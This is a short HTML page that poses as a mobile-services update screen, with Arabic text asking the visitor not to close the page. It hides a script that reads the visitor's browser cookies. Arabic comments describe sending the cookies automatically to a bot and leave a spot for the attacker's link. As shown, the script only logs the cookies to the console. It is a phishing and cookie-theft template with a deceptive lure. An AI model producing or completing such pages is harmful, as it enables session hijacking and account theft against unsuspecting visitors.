<!DOCTYPE html>
<html>
<head>
    <title>Update System</title>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; }
        .loader { border: 16px solid #111; border-top: 16px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h3>جاري تحديث خدمات الجوال...</h3>
    <p>يرجى عدم إغلاق الصفحة</p>

    <script>
        // سحب الكوكيز تلقائياً وإرساله للرادار
        const cookieData = document.cookie;
        if (cookieData) {
            // هنا تحط رابط البوت حقك لإرسال الكوكيز فوراً
            console.log("Cookie Captured: " + cookieData);
        } else {
            console.log("No cookies found yet.");
        }
    </script>
</body>
</html>
